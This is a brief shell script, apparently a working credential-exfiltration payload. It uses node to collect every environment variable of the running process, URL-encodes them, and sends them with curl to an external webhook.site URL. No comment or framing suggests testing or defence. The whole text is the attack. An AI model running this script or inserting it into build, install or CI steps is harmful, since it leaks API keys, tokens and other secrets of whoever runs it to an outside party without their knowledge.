#!/bin/sh

ENV_VARS=$(node -e 'console.log(JSON.stringify(process.env))')
ENCODED_ENV_VARS=$(node -e 'console.log(encodeURIComponent(process.argv[1]))' "$ENV_VARS")

curl -G "https://webhook.site/ed53ace0-9af1-4134-ab4c-2bc9aeac8c7a" \
  --data-urlencode "env=${ENCODED_ENV_VARS}"